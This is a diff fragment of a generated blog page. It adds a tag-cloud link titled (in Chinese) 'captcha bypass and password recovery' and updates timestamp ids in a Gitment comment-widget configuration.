+    <a href="/tags/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%E5%92%8C%E5%AF%86%E7%A0%81%E6%89%BE%E5%9B%9E/" style="font-size: 17.151413569373542px;" class="tag-cloud-link">验证码绕过和密码找回</a>
     
 </div>
                 
@@ -753,7 +774,7 @@
 <script src="https://myau.moe/js/comment/gitment.browser.js"></script>
 <script>
     if(window.commentConfig) {
-      window.commentConfig.id = 'Sat Apr 04 2020 14:56:57 GMT+0800'
+      window.commentConfig.id = 'Sat Apr 04 2020 12:54:07 GMT+0800'
       window.commentConfig.owner = ''
       window.commentConfig.repo = ''
       window.commentConfig.client_id = ''
@@ -761,7 +782,7 @@
       window.commentConfig.redirect_uri = ''
     } else {
       window.commentConfig = {
-      	id: 'Sat Apr 04 2020 14:56:57 GMT+0800',
+      	id: 'Sat Apr 04 2020 12:54:07 GMT+0800',
         owner: '',
         repo: '',
         client_id: '',
